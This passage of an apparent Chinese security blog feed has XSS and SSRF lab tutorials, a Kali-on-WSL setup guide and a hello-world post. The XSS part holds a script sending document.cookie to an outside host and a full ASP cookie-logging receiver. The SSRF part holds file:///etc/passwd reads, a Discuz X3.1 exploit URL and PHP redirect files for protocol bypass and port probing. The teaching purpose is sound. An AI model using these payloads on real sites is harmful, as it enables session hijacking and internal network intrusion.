class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 来进行测试</p><p>有些情况手工检测漏洞的效率比全自动检测软件更快，因为测试人员通过经验可以快速发现输入点，这些是扫描器无法比拟的。</p><p>另外一些xss漏洞也不仅仅是直接注入到HTML，可能数据中才触发，比如再上传文件时修改文件名为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"</span><br></pre></td></tr></table></figure><p>那么程序在读文件名显示在html文档中，也会触发xss跨站漏洞的。</p><p>有输入的地方就可能存在着风险，如果连输入都没有，xss就不必检测了，包括其他安全漏洞</p><h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><h3 id="0x00-XSS会话劫持"><a href="#0x00-XSS会话劫持" class="headerlink" title="0x00 XSS会话劫持"></a><strong>0x00 XSS会话劫持</strong></h3><p><strong>盗取cookie：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(doucument.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg" alt="img"></p><p><strong>会话劫持：</strong></p><p>劫持的cookie代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://192.168.0.25:8007/XSS_savecookie.asp?xcookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSS_savecookie.asp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;font size=&quot;4&quot; color=&quot;#FF0000&quot;&gt;&lt;b&gt;自动接收跨站脚本截取到的Cookie信息，保存于cookie_xss.txt文件中。&lt;/b&gt; &lt;/font&gt;</span><br><span class="line">&lt;%</span><br><span class="line">dim XCookie,StrCookieText,strLogFile,XUser</span><br><span class="line">strLogFile=&quot;cookie_xss.txt&quot;</span><br><span class="line">XCookie=request(&quot;xcookie&quot;)</span><br><span class="line">XUser=request(&quot;user&quot;)</span><br><span class="line">if XCookie=&quot;&quot;  then</span><br><span class="line">  response.write &quot;cookie信息为空！&quot;</span><br><span class="line">  response.end</span><br><span class="line">End If</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot;Cookie值为：----&quot;&amp;XCookie&amp;&quot; user=&quot;&amp;XUser&amp;&quot;----&quot;&amp;request.servervariables(&quot;REMOTE_HOST&quot;)</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot; &quot;&amp;date&amp;&quot; &quot;&amp;time</span><br><span class="line"></span><br><span class="line">set f=Server.CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set ff=f.opentextfile(server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&amp;strLogFile,8,true,0)</span><br><span class="line">ff.writeline(chr(13)+chr(10)&amp;StrCookieText)</span><br><span class="line">ff.close</span><br><span class="line">set ff=nothing</span><br><span class="line">set f=nothing</span><br><span class="line">                      </span><br><span class="line">response.write &quot;&lt;br&gt;&lt;br&gt;提示：此脚本仅限测试!&quot;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/BJfAohunNzHQjXx.png" alt="微信截图_20210110113640"></p><h2 id="xss防御策略"><a href="#xss防御策略" class="headerlink" title="xss防御策略"></a>xss防御策略</h2><h2 id="★注"><a href="#★注" class="headerlink" title="★注"></a>★注</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h3><p>是一种约定，他是浏览器最核心也是最基本的安全功能，可以说web是建立在同源策略的基础上的，浏览器只是针对同源策略的一种实现</p><p>同源策略的四大要素：</p><p>1，host（域名或IP地址，如果是IP地址则看作一个根域名）</p><p>2，子域名</p><p>3，端口</p><p>4，协议</p><p>对于浏览器来说受同源策略约束的有DOM，Cookie，XMLHttprequest，以及浏览器加载的第三方插件也有各自的同源策略。例如：flash，java applet，silverlight，coogle gears等。</p><p>不受约束的有：在浏览器中，对于标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">,<span class="tag">&lt;<span class="name">img</span>&gt;</span>,<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>,<span class="tag">&lt;<span class="name">link</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>等标签都可以跨域加载资源，而不受同源策略的限制。这些带有”src“属性的标签每次加载的时候，实际上是由浏览器发起的一个get请求。</p><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><strong>XSS平台</strong></h3><p>BeEF,XSS Proxy，Backframe，国内的XXSER.ME(XSS Platfrom)也是比较优秀的XSS漏洞利用框架</p><p>其实框架是一组”javascript“工具集合，比如实现键盘记录，点击劫持等</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;xss攻击原理&quot;&gt;&lt;a href=&quot;#xss攻击原理&quot; class=&quot;headerlink&quot; title=&quot;xss攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;xss攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="xss" scheme="http://goudanjun.vip/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/09/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/09/ssrf漏洞总结及实战.html/</id>
    <published>2021-01-09T04:47:28.000Z</published>
    <updated>2021-01-12T06:39:46.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF攻击原理"><a href="#SSRF攻击原理" class="headerlink" title="SSRF攻击原理"></a><strong>SSRF攻击原理</strong></h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><a id="more"></a><h3 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?url=http://google.com/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在这里，<a href="http://example.com从它的服务器获取http://google.com" target="_blank" rel="noopener">http://example.com从它的服务器获取http://google.com</a></p><p><img src="https://i.loli.net/2021/01/09/BXCedG2Dlz6EaKt.jpg" alt="v2-e92913401482f654b988eab6e46c9c99_720w"></p><h2 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h2><ol><li><p>显示攻击者的响应（Basic）</p></li><li><p>不显示响应（Blind）</p></li></ol><h2 id="什么地方最容易出现SSRF"><a href="#什么地方最容易出现SSRF" class="headerlink" title="什么地方最容易出现SSRF"></a>什么地方最容易出现SSRF</h2><ol><li>云服务器商。(各种网站数据库操作)</li><li>有远程图片加载的地方。(编辑器之类的有远程图片加载啊)</li><li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li><li>头像的地方。(某易就喜欢远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg" target="_blank" rel="noopener">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li><li>最后一个一切要你输入网址的地方和可以输入ip的都放，都是ssrf的天下。</li></ol><h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a><strong>SSRF</strong>漏洞的危害</h2><ol><li>对服务器所在的内网进行端口扫描，获取一些服务的banner信息等</li><li>攻击运行在内网或者本地的应用程序</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li><li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li><li>下载内网资源（利用file协议读取本地文件等）</li><li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li><li>wooyun峰会猪猪侠的ppt</li><li>进行跳板</li><li>无视cdn</li></ol><h2 id="SSRF神器Curl的使用"><a href="#SSRF神器Curl的使用" class="headerlink" title="SSRF神器Curl的使用"></a><strong>SSRF神器Curl的使用</strong></h2><p>查看curl支持的协议列表 #curl–config –protocols</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用curl读取文件</span></span><br><span class="line">curl -v <span class="string">"file:///etc/passwd"</span></span><br><span class="line"><span class="comment">#使用ftp协议</span></span><br><span class="line">curl -v <span class="string">"ftp://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用dict协议</span></span><br><span class="line">curl -v <span class="string">"dict://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用gopher协议</span></span><br><span class="line">curl -v <span class="string">"gopher://127.0.0.1:6666/_info"</span></span><br></pre></td></tr></table></figure><h2 id="最常用的跳转绕过"><a href="#最常用的跳转绕过" class="headerlink" title="最常用的跳转绕过"></a>最常用的跳转绕过</h2><p>一些服务器可能限定了只能使用http和https，这样就可以通过header跳转绕过</p><p><img src="https://i.loli.net/2021/01/09/pd5fo1PDSFkNVr7.jpg" alt="v2-71bcbdbcb44534474a386c2f4479c8b2_720w"></p><h2 id="Python-SSRF实现端口扫描"><a href="#Python-SSRF实现端口扫描" class="headerlink" title="Python+SSRF实现端口扫描"></a><strong>Python+SSRF实现端口扫描</strong></h2><p>简单的端口扫描</p><p><img src="https://i.loli.net/2021/01/09/RJFnikj9Apb2ON5.jpg" alt="2"></p><p>同时观察Wireshark整个扫描流程</p><p><img src="https://i.loli.net/2021/01/09/6IaAdCSbDcMF3Ko.jpg" alt="3"></p><p>代码实现：</p><p><img src="https://i.loli.net/2021/01/09/AHjnXzGoZQvrxSt.jpg" alt="4"></p><p>验证本地是否开启了相应的端口</p><p><img src="https://i.loli.net/2021/01/09/mu8nMTFzNafhZPs.jpg" alt="5"></p><p>Python代码编写的思路：</p><p>端口存在连接会一直在连接，连接时间会很长。</p><p><img src="https://i.loli.net/2021/01/09/rRWweQIZ6nkbhsH.jpg" alt="6"></p><p>端口不存在的连接会被立马刷新</p><p><img src="https://i.loli.net/2021/01/09/TsdaMScUHOzGLmn.jpg" alt="7"></p><h2 id="SSRF实战"><a href="#SSRF实战" class="headerlink" title="SSRF实战"></a>SSRF实战</h2><p>环境：win10（Discuz! X3.1），kali（nc监听；IP：192.168.239.134）</p><p>Discuz下载地址：[Discuz!]:<a href="https://www.discuz.net/thread-3457145-1-1.html" target="_blank" rel="noopener">https://www.discuz.net/thread-3457145-1-1.html</a></p><p><img src="https://i.loli.net/2021/01/09/PWD5LF8dTyg9uia.png" alt="1"></p><ol><li><h3 id="在kali上监听-6666-端口"><a href="#在kali上监听-6666-端口" class="headerlink" title="在kali上监听 6666 端口"></a>在kali上监听 6666 端口</h3><p><img src="https://i.loli.net/2021/01/09/VDqtLxAl2iFd9gC.png" alt="2"></p><p><img src="https://i.loli.net/2021/01/09/uFWw4Uc2okJaIlv.png" alt="微信截图_20210109192239"></p></li><li><h3 id="利用Discuz-3-1的ssrf漏洞进行请求访问"><a href="#利用Discuz-3-1的ssrf漏洞进行请求访问" class="headerlink" title="利用Discuz 3.1的ssrf漏洞进行请求访问"></a>利用Discuz 3.1的ssrf漏洞进行请求访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.3.26:6666/?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/BhK9NzIPZpf8Xie.png" alt="3"></p></li><li><h3 id="可以看出在kali上监听到了本机发来的get请求"><a href="#可以看出在kali上监听到了本机发来的get请求" class="headerlink" title="可以看出在kali上监听到了本机发来的get请求"></a>可以看出在kali上监听到了本机发来的get请求</h3><p><img src="https://i.loli.net/2021/01/09/2I4xhV5Qgudn6PF.png" alt="4"></p><h3 id="绕过header限制"><a href="#绕过header限制" class="headerlink" title="绕过header限制"></a>绕过header限制</h3><p>很多网站不允许使用ftp dict gopher协议去请求的，所以需要php函数 header来绕过</p><p>在公网的服务器上建立一个 dict.php 文件，写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"location: dict://192.168.136.133:6666/info"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/fJyFN4GwZA78SR1.png" alt="微信截图_20210109202024"></p><p>在discuz中构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.239.137/dict.php?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/ZOfyAEYqIhPFxsi.png" alt="微信截图_20210109202101"></p><p>回到kali中查看结果，成功接收到了请求info，成功利用header绕过限制，其他协议的绕过，改我们创建的php文件中的协议名称即可</p><p><img src="https://i.loli.net/2021/01/09/H4JgAXPjwrC7zh2.png" alt="微信截图_20210109202140"></p></li></ol><h3 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h3><p>在公网服务器上创建 port.php 内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>]; </span><br><span class="line">$port = $_GET[<span class="string">'port'</span>]; </span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>]; </span><br><span class="line">$data = $_GET[<span class="string">'data'</span>]; </span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port:$data"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造如下payload</p><p><img src="https://i.loli.net/2021/01/09/v59Yh8l1fD4RuPS.png" alt="微信截图_20210109202539"></p><p>如果加载的时间很长，说明该端口是开放的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSRF攻击原理&quot;&gt;&lt;a href=&quot;#SSRF攻击原理&quot; class=&quot;headerlink&quot; title=&quot;SSRF攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSRF攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ssrf" scheme="http://goudanjun.vip/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>在win10上安装kali子系统</title>
    <link href="http://goudanjun.vip/2019/07/31/%E5%9C%A8win10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%AD%90%E7%B3%BB%E7%BB%9F.html/"/>
    <id>http://goudanjun.vip/2019/07/31/在win10上安装kali子系统.html/</id>
    <published>2019-07-31T12:32:40.000Z</published>
    <updated>2021-01-12T06:39:35.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打开windows开发人员模式"><a href="#打开windows开发人员模式" class="headerlink" title="打开windows开发人员模式"></a>打开windows开发人员模式</h2><a id="more"></a><p><img src="https://i.loli.net/2021/01/07/ZmgqurUfKR7WDTL.png" alt="009234530215"></p><p><img src="https://i.loli.net/2021/01/07/MvQfoUlqPHk67Xg.png" alt="2"></p><h2 id="打开windows子系统功能"><a href="#打开windows子系统功能" class="headerlink" title="打开windows子系统功能"></a>打开windows子系统功能</h2><p><img src="https://i.loli.net/2021/01/07/tYrgvK4paqlo2ch.png" alt="img"></p><h2 id="安装子系统，在windows商店搜索wsl"><a href="#安装子系统，在windows商店搜索wsl" class="headerlink" title="安装子系统，在windows商店搜索wsl"></a>安装子系统，在windows商店搜索wsl</h2><p><img src="https://i.loli.net/2021/01/07/YGAxrdcQBeTFu9S.png" alt="img"></p><p><img src="https://i.loli.net/2021/01/07/eREJ2I81VziHKZl.png" alt="img"></p><p>安装</p><p>安装完成后设置用户名为kali，设置密码</p><p>至此命令行kali安装完成</p><h2 id="安装图形化界面"><a href="#安装图形化界面" class="headerlink" title="安装图形化界面"></a>安装图形化界面</h2><p>安装vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>更换kali源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加下边的两个源：</p><p>#中科大</p><blockquote><p>deb <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib </p><p>deb-src <a href="https://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p></blockquote><p>保存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update <span class="comment">#更新源 </span></span><br><span class="line"></span><br><span class="line">wget https://kali.sh/xfce4.sh sudo sh xfce4.sh <span class="comment">#安装桌面环境 </span></span><br><span class="line"></span><br><span class="line">sudo /etc/init.d/xrdp start <span class="comment">#开启桌面</span></span><br></pre></td></tr></table></figure><p>#这时候可以使用 windows 的远程桌面连接，输入 127.0.0.1：3390</p><p>#当不想使用桌面环境时，点击 logout 后在命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/xrdp stop</span><br></pre></td></tr></table></figure><h2 id="安装kali-工具"><a href="#安装kali-工具" class="headerlink" title="安装kali 工具"></a>安装kali 工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装python</span></span><br><span class="line">sudo apt-get install python</span><br><span class="line"><span class="comment">#安装gnupg</span></span><br><span class="line">sudo apt-get install gnupg</span><br><span class="line"><span class="comment">#安装git</span></span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>下载工具包脚本，并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/katoolin.git &amp;&amp; sudo cp katoolin/katoolin.py /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/katoolin </span><br><span class="line"></span><br><span class="line">sudo katoolin</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行(1-&gt;1-&gt;2) -&gt; back -&gt; (2-&gt;0)</span></span><br></pre></td></tr></table></figure><p>即可安装工具成功</p><p>注: 有可能出现安装不成功类似于图示错误</p><p><img src="https://i.loli.net/2021/01/07/DrmB2uhgR38bGWa.png" alt="img"></p><p>由于某些工具不存在源或其他原因不能一次全部安装，需要修改/usr/bin/katoolin 中源代码，将不存在的工具删除</p><p>下面是我更改好的源代码地址</p><blockquote><p><a href="https://github.com/Gr3enh4nd/katoolin.git" target="_blank" rel="noopener">https://github.com/Gr3enh4nd/katoolin.git</a></p></blockquote><p>至此工具安装完成</p><p>我们打开一个msf</p><h2 id="注"><a href="#注" class="headerlink" title="注"></a><strong>注</strong></h2><h3 id="安装kali工具另一种方法："><a href="#安装kali工具另一种方法：" class="headerlink" title="安装kali工具另一种方法："></a><strong>安装kali工具另一种方法：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-full</span><br></pre></td></tr></table></figure><h3 id="更改默认用户为root："><a href="#更改默认用户为root：" class="headerlink" title="更改默认用户为root："></a><strong>更改默认用户为root：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali config --default-user root </span><br><span class="line"></span><br><span class="line">//WSL 子系统是基于 LxssManager 服务运行的，在更改过默认用户后，我们需要重启该服务，使改动生效 </span><br><span class="line"></span><br><span class="line">net stop LxssManager </span><br><span class="line"></span><br><span class="line">net start LxssManager</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;打开windows开发人员模式&quot;&gt;&lt;a href=&quot;#打开windows开发人员模式&quot; class=&quot;headerlink&quot; title=&quot;打开windows开发人员模式&quot;&gt;&lt;/a&gt;打开windows开发人员模式&lt;/h2&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://goudanjun.vip/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://goudanjun.vip/2019/07/24/hello-world.html/"/>
    <id>http://goudanjun.vip/2019/07/24/hello-world.html/</id>
    <published>2019-07-24T12:27:22.000Z</published>
    <updated>2021-01-07T15:02:44.998Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Bat命令"><a href="#Bat命令" class="headerlink" title="Bat命令"></a>Bat命令</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Hello, world!</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"Hello,world!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        System.out.println( <span class="string">"Hello, World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello, World!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-2"><a href="#C-2" class="headerlink" title="C"></a>C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">namespace HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">   &#123;</span><br><span class="line">            System.Console.Write(&quot;Hello, World!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, world!'</span>;  </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Hello, world!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.write (&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert (<span class="string">"Hello, World!"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">``</span><span class="string">"Hello, World!"</span><span class="string">``</span>);</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span 